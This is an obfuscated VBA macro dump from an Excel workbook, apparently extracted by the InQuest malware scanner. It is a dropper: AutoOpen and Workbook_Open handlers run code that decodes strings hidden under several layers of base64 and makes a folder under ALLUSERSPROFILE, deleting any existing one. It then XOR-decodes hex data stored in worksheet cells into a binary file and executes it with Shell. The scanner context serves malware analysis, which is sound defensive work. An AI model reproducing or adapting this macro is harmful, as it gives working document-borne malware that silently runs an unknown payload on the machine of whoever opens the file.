Attribute VB_Name = "Arkusz1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Arkusz2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Arkusz3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Arkusz4"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Module1"
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

Option Explicit

Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOneMask = 16515072          'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX000000 111111 111111 111111
Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATwoMask = 258048            'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX111111 000000 111111 111111
Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAThreeMask = 4032            'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX111111 111111 000000 111111
Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFourMask = 63               'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX111111 111111 111111 000000

Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHighMask = 16711680         'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX11111111 00000000 00000000
Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMidMask = 65280             'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX00000000 11111111 00000000
Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALowMask = 255               'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX00000000 00000000 11111111

Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp18 = 262144             'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX2 to the 18th power
Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp12 = 4096               'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX2 to the 12th
Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp6 = 64                  'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX2 to the 6th
Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp8 = 256                 'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX2 to the 8th
Private Const AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp16 = 65536              'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX2 to the 16th

Public Function Encode64(sString As String) As String

    Dim bTrans(63) As Byte, lPowers8(255) As Long, lPowers16(255) As Long, bOut() As Byte, bIn() As Byte
    Dim lChar As Long, lTrip As Long, iPad As Integer, lLen As Long, lTemp As Long, lPos As Long, lOutSize As Long

    For lTemp = 0 To 63                                 'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXFill the translation table.
        Select Case lTemp
            Case 0 To 25
                bTrans(lTemp) = 65 + lTemp              'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXA - Z
            Case 26 To 51
                bTrans(lTemp) = 71 + lTemp              'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXa - z
            Case 52 To 61
                bTrans(lTemp) = lTemp - 4               'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX1 - 0
            Case 62
                bTrans(lTemp) = 43                      'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXChr(43) = "+"
            Case 63
                bTrans(lTemp) = 47                      'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXChr(47) = "/"
        End Select
    Next lTemp

    For lTemp = 0 To 255                                'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXFill the 2^8 and 2^16 lookup tables.
        lPowers8(lTemp) = lTemp * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp8
        lPowers16(lTemp) = lTemp * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp16
    Next lTemp

    iPad = Len(sString) Mod 3                           'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXSee if the length is divisible by 3
    If iPad Then                                        'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXIf not, figure out the end pad and resize the input.
        iPad = 3 - iPad
        sString = sString & String(iPad, Chr(0))
    End If

    bIn = StrConv(sString, vbFromUnicode)               'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXLoad the input string.
    lLen = ((UBound(bIn) + 1) \ 3) * 4                  'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXLength of resulting string.
    lTemp = lLen \ 72                                   'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXAdded space for vbCrLfs.
    lOutSize = ((lTemp * 2) + lLen) - 1                 'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXCalculate the size of the output buffer.
    ReDim bOut(lOutSize)                                'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXMake the output buffer.

    lLen = 0                                            'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXReusing this one, so reset it.

    For lChar = LBound(bIn) To UBound(bIn) Step 3
        lTrip = lPowers16(bIn(lChar)) + lPowers8(bIn(lChar + 1)) + bIn(lChar + 2)    'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXCombine the 3 bytes
        lTemp = lTrip And AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOneMask                     'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXMask for the first 6 bits
        bOut(lPos) = bTrans(lTemp \ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp18)           'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXShift it down to the low 6 bits and get the value
        lTemp = lTrip And AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATwoMask                     'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXMask for the second set.
        bOut(lPos + 1) = bTrans(lTemp \ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp12)       'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXShift it down and translate.
        lTemp = lTrip And AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAThreeMask                   'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXMask for the third set.
        bOut(lPos + 2) = bTrans(lTemp \ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp6)        'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXShift it down and translate.
        bOut(lPos + 3) = bTrans(lTrip And AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFourMask)   'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXMask for the low set.
        If lLen = 68 Then                               'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXReady for a newline
            bOut(lPos + 4) = 13                         'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXChr(13) = vbCr
            bOut(lPos + 5) = 10                         'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXChr(10) = vbLf
            lLen = 0                                    'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXReset the counter
            lPos = lPos + 6
        Else
            lLen = lLen + 4
            lPos = lPos + 4
        End If
    Next lChar

    If bOut(lOutSize) = 10 Then lOutSize = lOutSize - 2 'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXShift the padding chars down if it ends with CrLf.

    If iPad = 1 Then                                    'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXAdd the padding chars if any.
        bOut(lOutSize) = 61                             'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXChr(61) = "="
    ElseIf iPad = 2 Then
        bOut(lOutSize) = 61
        bOut(lOutSize - 1) = 61
    End If

    Encode64 = StrConv(bOut, vbUnicode)                 'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXConvert back to a string and return it.

End Function

Public Function xaxaxaxaxaxaxo(sString As String) As String

    Dim bOut() As Byte, bIn() As Byte, bTrans(255) As Byte, lPowers6(63) As Long, lPowers12(63) As Long
    Dim lPowers18(63) As Long, lQuad As Long, iPad As Integer, lChar As Long, lPos As Long, sOut As String
    Dim lTemp As Long

    sString = Replace(sString, vbCr, vbNullString)      'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXGet rid of the vbCrLfs.  These could be in...
    sString = Replace(sString, vbLf, vbNullString)      'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXeither order.

    lTemp = Len(sString) Mod 4                          'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXTest for valid input.
    If lTemp Then
        Call Err.Raise(vbObjectError, "MyDecode", "Input string is not valid Base64.")
    End If

    If InStrRev(sString, "==") Then                     'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXInStrRev is faster when you know it'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXs at the end.
        iPad = 2                                        'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXNote:  These translate to 0, so you can leave them...
    ElseIf InStrRev(sString, "=") Then                  'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXin the string and just resize the output.
        iPad = 1
    End If

    For lTemp = 0 To 255                                'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXFill the translation table.
        Select Case lTemp
            Case 65 To 90
                bTrans(lTemp) = lTemp - 65              'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXA - Z
            Case 97 To 122
                bTrans(lTemp) = lTemp - 71              'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXa - z
            Case 48 To 57
                bTrans(lTemp) = lTemp + 4               'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXX1 - 0
            Case 43
                bTrans(lTemp) = 62                      'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXChr(43) = "+"
            Case 47
                bTrans(lTemp) = 63                      'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXChr(47) = "/"
        End Select
    Next lTemp

    For lTemp = 0 To 63                                 'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXFill the 2^6, 2^12, and 2^18 lookup tables.
        lPowers6(lTemp) = lTemp * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp6
        lPowers12(lTemp) = lTemp * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp12
        lPowers18(lTemp) = lTemp * AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp18
    Next lTemp

    bIn = StrConv(sString, vbFromUnicode)               'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXLoad the input byte array.
    ReDim bOut((((UBound(bIn) + 1) \ 4) * 3) - 1)       'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXPrepare the output buffer.

    For lChar = 0 To UBound(bIn) Step 4
        lQuad = lPowers18(bTrans(bIn(lChar))) + lPowers12(bTrans(bIn(lChar + 1))) + _
                lPowers6(bTrans(bIn(lChar + 2))) + bTrans(bIn(lChar + 3))           'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXRebuild the bits.
        lTemp = lQuad And AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHighMask                    'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXMask for the first byte
        bOut(lPos) = lTemp \ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp16                   'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXShift it down
        lTemp = lQuad And AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMidMask                     'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXMask for the second byte
        bOut(lPos + 1) = lTemp \ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Exp8                'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXShift it down
        bOut(lPos + 2) = lQuad And AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALowMask            'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXMask for the third byte
        lPos = lPos + 3
    Next lChar

    sOut = StrConv(bOut, vbUnicode)                     'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXConvert back to a string.
    If iPad Then sOut = Left$(sOut, Len(sOut) - iPad)   'HHHHHHHHHHHHHHHHHHJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJXXXXXXXXXXXXXChop off any extra bytes.
    xaxaxaxaxaxaxo = sOut

End Function
Sub NAshau7asKKK()
MELBUERNEX
End Sub

Sub S1(b As String)
MkDir (xaxaxaxaxaxaxo(Encode64(b)))
End Sub
Sub S2(b As String)
ChDir (xaxaxaxaxaxaxo(Encode64(b)))
End Sub
Sub MELBUERNEX()
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH913730176 As Integer
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3765520675 As Integer
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2378093997 As String
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH237809399799 As String
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544 As String
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3380893112 As Integer
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2176626066 As Long
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH4287689968 As Boolean
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2724018524 As Integer
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH23780939971 As String
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2378093997199 As String
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3800589039 As Byte
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH380058903999 As Byte
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3814328212 As String
    MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3814328212 = xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo("Vm0xNFUxUXhWWGxTYTJoVllteGFWMWx0ZEV0alJteHpWbFJHYWsxWVFsZFZiRkp6VlZaV1ZVMUVhejA9"))))))
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH4010320798 As String
    MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544 = Environ("ALLUSERSPROFILE") + xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo("Vm0xd1ExWXhXblJXYTJoVVlUSm9WVmxyWkRSV2JHeFlaVWRHYWxadVFrcFphazVyVlVaV1ZVMUVhejA9")))))))

    If Len(Dir(MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544, vbDirectory)) = 0 Then
        S1 (MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544)
    Else:
        Wipedir (MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544)
        S1 (MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544)
    End If
       Dim haxhax As String
       haxhax = xaxaxaxaxaxaxo("Jkg=")
    MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2378093997 = xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo("VmpGa05HSXhVblJWYkdScVVtMTRiMVZxVG1wUFVUMDk="))))))
    ChDrive (MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544)
    S2 (MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544)
    MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3380893112 = FreeFile()
    Open MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2378093997 For Binary As MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3380893112
            Worksheets(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo("Vm0xNFYxbFdUWGhXYTJSWVlURndXRmxVUmt0WFJsWnpWMjFHVTFwNk1Eaz0="))))))).Activate
Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3831184804 As Integer
         For MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3831184804 = 0 To 1000 Step 1
            MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH23780939971 = ThisWorkbook.Worksheets(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo("Vm0xNFYxbFdUWGhXYTJSWVlURndXRmxVUmt0WFJsWnpWMjFHVTFwNk1Eaz0="))))))).Cells(1337 + MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3831184804, 1).Value
            MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2176626066 = 1
            
            If Len(MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH23780939971) > 0 Then
            While (MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2176626066 < Len(MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH23780939971))
                MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3800589039 = haxhax & Mid(MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH23780939971, MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2176626066, 2)
                MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3800589039 = MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3800589039 Xor &H75
                Put #MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3380893112, , MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3800589039
                MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2176626066 = MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2176626066 + 2
            Wend
            End If
        Next MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3831184804
 
    Close #MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH3380893112
    MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH23780939973 (MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH2378093997)
End Sub


Public Sub Wipedir(eee As String)
Dim APAPAPAPAPAPAPAPAPAPAPAPAPAPAPAPAP
Set APAPAPAPAPAPAPAPAPAPAPAPAPAPAPAPAP = CreateObject(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo("Vm0weE5GVXhUWGhWV0d4WFlrZG9WRmxyWkRSVk1XeFlaRVYwYVUxV2NERlpNRnByWVRGYWMxTnJiR0ZTVjFKSVdWZDRTbVF5VGtaaVJtUnBWMGRvVlZkWGRHRmhNVXB5VGxWc1lWSnRhSEJWYWtFd1RVWmFjMVp0Um1wTmJFcEpWa2QwYjJKR1NuVlJhemxWVm14YVYxUnNSVGxRVVQwOQ=="))))))))
If APAPAPAPAPAPAPAPAPAPAPAPAPAPAPAPAP.folderexists(eee) Then
APAPAPAPAPAPAPAPAPAPAPAPAPAPAPAPAP.deletefolder eee
Else
End
End If

End Sub

Sub MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH23780939973(MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH23780939970 As String)
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH913730176 As Integer
    Dim MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544 As String
MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544 = Environ("ALLUSERSPROFILE") + xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo("Vm0xd1ExWXhXblJXYTJoVVlUSm9WVmxyWkRSV2JHeFlaVWRHYWxadVFrcFphazVyVlVaV1ZVMUVhejA9")))))))
    ChDrive (MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544)
    S2 (MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544)
    MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH913730176 = Shell(MMMMMMMMMMIIIIIIIIIIIIIISSSSSSSSSSSHHHH584897544 + xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo(xaxaxaxaxaxaxo("Vm0xd1ExWXlSblJXYTJoWFltdHdjMVV3V2t0WFJteFlaVVYwYUZKc2NGaFdWbWhyVlVaV1ZVMUVhejA9"))))))), 1)
End Sub

Sub AutoOpen()
NAshau7asKKK
End Sub

Private Sub Workbook_Open()
NAshau7asKKK
End Sub












' InQuest injected base64 decoded content
' \*&n)
' ](b~
' Vm14U1QxVXlSa2hVYmxaV1ltdEtjRmxzVlRGak1YQldVbFJzVVZWVU1Eaz0=
' Vm1wQ1YxWnRWa2hUYTJoVVlrZDRWbGxYZUdGalZuQkpZak5rVUZWVU1Eaz0=
' VjFkNGIxUnRVbGRqUm14b1VqTmpPUT09
' Vm14V1lWTXhWa2RYYTFwWFlURktXRlZzV21GU1p6MDk=
' Vm0xNFUxTXhVWGxXYkdoVFlrZDRVMWxYZEV0aU1WcDFZMFprYTFac1NrbGFSV1JIWVd4SmQyTkZiRmRpV0doVVdXdGFhMUpyTlVsYVJtaHBVakEwTUZac1ZtRmpNbEpJVkd0b2JGSnVRazlVVmxaV1RsRTlQUT09
' Vm1wQ1YyRnRWa2hXYmtwc1UwWktXRmxYZUV0aFJscFhWVmhrVUZWVU1Eaz0=

INQUEST-PP=macro
